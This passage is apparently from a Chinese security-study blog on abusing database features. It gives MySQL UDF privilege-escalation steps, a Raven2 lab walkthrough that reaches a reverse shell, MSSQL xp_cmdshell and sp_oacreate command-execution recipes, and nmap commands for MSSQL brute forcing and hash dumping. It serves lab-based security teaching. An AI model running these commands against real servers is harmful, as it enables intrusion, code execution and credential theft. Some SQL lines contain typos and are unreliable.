+<p>1、查询导出路径和条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br><span class="line">select @@plugin_dir;</span><br><span class="line">select @@version_compile_os,@@version_compile_machine;</span><br></pre></td></tr></table></figure>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_044-1567178982005.jpg" alt="image"></p>
+<p>注意</p>
+<p>如该目录不存在，则需要创建</p>
+<p>select @@basedir;</p>
+<p>select ‘It is dll’ into dumpfile ‘C:\ProgramFile\MYSQL路径\lib::$INDEX_ALLOCATION’;</p>
+<p>select ‘It is dll’ into dumpfile ‘C:\ProgramFile\MYSQL路径\lib\plugin::$INDEX_ALLOCATION’;</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_046-1567178982005.png" alt="image"></p>
+<p>2、上传udf</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_047-1567178982005.jpg" alt="image"></p>
+<p>sqlmap中的udf需要解码</p>
+<p><code>sqlmap/extra/cloak/cloak.py -d -i udf路径文件</code></p>
+<p>将udf文件进行十六进制编码，然后创建一张临时表，插入udf数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crate table temp(data blob);</span><br><span class="line">insert into temp(data)values((convert($binaryCode_udf_data,char))));</span><br></pre></td></tr></table></figure>
+<p>注意</p>
+<p>对udf进行十六进制编码，可以首先在本地创建临时表，利用hex()函数进行编码导入，然后再直接导出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table temp_test(data blob);</span><br><span class="line"></span><br><span class="line">insert into temp_test(data) values(hex(load_file(&#39;udf路径文件&#39;))); select data from temp_test into dumpfile &#39;udf路径文件&#39;;</span><br></pre></td></tr></table></figure>
+<p>3、导出udf</p>
+<p><code>select data from temp into dumpfile '路径\\plugin\udf.dll';</code></p>
+<p><code> drop table temp;</code></p>
+<p>4、创建函数</p>
+<p><code>crate function sys_eval returns string soname 'udf.dll';</code></p>
+<p>5、执行命令</p>
+<p><code>select sys_eval(command); drop function sys_eval;</code></p>
+<p><code>delete from mysql.func where name = 'sys_eval';</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_054-1567178982005.png" alt="image"></p>
+<p>以Raven2靶机的udf<a href="https://www.vulnhub.com/entry/raven-2%2C269/" target="_blank" rel="noopener">提权作为例子</a><a href="https://www.vulnhub.com/entry/raven-2%2C269/" target="_blank" rel="noopener">靶机下载</a></p>
+<p>存活扫描：</p>
+<p>netdiscover</p>
+<p>端口扫描：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_056-1567178982005.jpg" alt="image"></p>
+<p>web服务踩点：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_057-1567178982005.jpg" alt="image"></p>
+<p>目录扫描：</p>
+<p><code>[dirb ](http://192.168.0.104/)http://192.168.0.104/ /usr/share/dirb/wordlists/big.txt</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_059-1567178982005.jpg" alt="image"></p>
+<p>博客扫描：</p>
+<p><code>[wpscan --url ](http://192.168.0.104/wordpress/)http://192.168.0.104/wordpress/ -e u</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_061-1567178982005.jpg" alt="image"></p>
+<p>发现两个用户</p>
+<p>目录踩点：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_062-1567178982006.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_063-1567178982006.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_064-1567178982006.jpg" alt="image"></p>
+<p>phpmailer挖掘：</p>
+<p><code>searchsploit phpmailer</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_066-1567178982006.jpg" alt="image"></p>
+<p>修改exp:</p>
+<p>安装py库requests_toolbelt #coding:utf-8</p>
+<p>靶机ip和文件 攻击机ip和端口</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_068-1567178982006.jpg" alt="image"></p>
+<p>触发反弹shell:</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_069-1567178982006.jpg" alt="image"></p>
+<p>查找到数据库账户信息：</p>
+<p>ﬂag2.txt</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_070-1567178982006.jpg" alt="image"></p>
+<p>ﬂag3.png</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_071-1567178982006.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_072-1567178982006.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_073-1567178982006.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_074-1567178982006.jpg" alt="image"></p>
+<p>mysql之udf提权：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_075-1567178982006.jpg" alt="image"></p>
+<p>编译</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_076-1567178982006.jpg" alt="image"></p>
+<p>上传</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_077-1567178982006.jpg" alt="image"></p>
+<p>登陆数据库</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_078-1567178982006.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_079-1567178982006.jpg" alt="image"></p>
+<p>导入数据库</p>
+<p>导出数据库</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_080-1567178982006.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_081-1567178982006.jpg" alt="image"></p>
+<p>创建函数</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_082-1567178982006.jpg" alt="image"></p>
+<p>使用函数</p>
+<p>执行命令</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_083-1567178982006.jpg" alt="image"></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_084-1567178982006.jpg" alt="image"></p>
+<h2 id="5-mssql的xp-cmdshell与sp-oacreate">5 mssql<strong>的</strong>xp_cmdshell<strong>与</strong>sp_oacreate</h2>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_085-1567178982006.png" alt="image"></p>
+<p>介绍：</p>
+<p>xp_cmdshell与sp_oacreate是mssql的存储过程的扩展，类似udf于mysql。</p>
+<p>xp_cmdshell的利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;reconfigure; </span><br><span class="line">exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</span><br><span class="line">exec master.dbo.xp_cmdshell &#39;command&#39;;</span><br></pre></td></tr></table></figure>
+<p>sp_oacreate的利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;reconfigure; </span><br><span class="line">exec sp_configure &#39;ole automation procedures&#39;,1;reconfigure;</span><br><span class="line"></span><br><span class="line">declare @shell int</span><br><span class="line">exec sp_oacreate &#39;wscript.shell&#39;,@shell out</span><br><span class="line">exec sp_method @shell,&#39;run&#39;,null,&#39; c:\windows\system32\cmd.exe \c &quot;command&quot; &#39;;</span><br></pre></td></tr></table></figure>
+<p>nmap对mmsql的支持：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 爆破mssql用户名和密码：</span><br><span class="line">nmap -p 1433 --script&#x3D;ms-sql-brute.nse --script-args&#x3D;userdb&#x3D;&#x2F;var&#x2F;passwd,passdb&#x3D;&#x2F;var&#x2F;passwd 192.168.1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># xp_cmdshell执行命令</span><br><span class="line">nmap -p 1433 --script&#x3D;ms-sql-xp-cmdshell.nse --script-args mssql.username&#x3D;sa,mssql.password&#x3D;sa,ms-sql-xp-cmdshell.cmd&#x3D;&quot;net user&quot; 192.168.1.1</span><br><span class="line"></span><br><span class="line">#dump_hash</span><br><span class="line">nmap -p 1433 --script&#x3D;ms-sql-dump-hashes.nse --script-args mssql,username&#x3D;sa,mssql.password&#x3D;sa 192.168.1.1</span><br></pre></td></tr></table></figure>
+<h1 id="六-sqli-labs-注入测试">六 sqli-labs 注入测试</h1>
+<h2 id="1-环境搭建">1 环境搭建</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#docker搭建sqli-labs</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;vulstudy.git </span><br><span class="line">cd vulstudy&#x2F;sqli-labs&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_004-1567178982004.jpg" alt="image"></p>
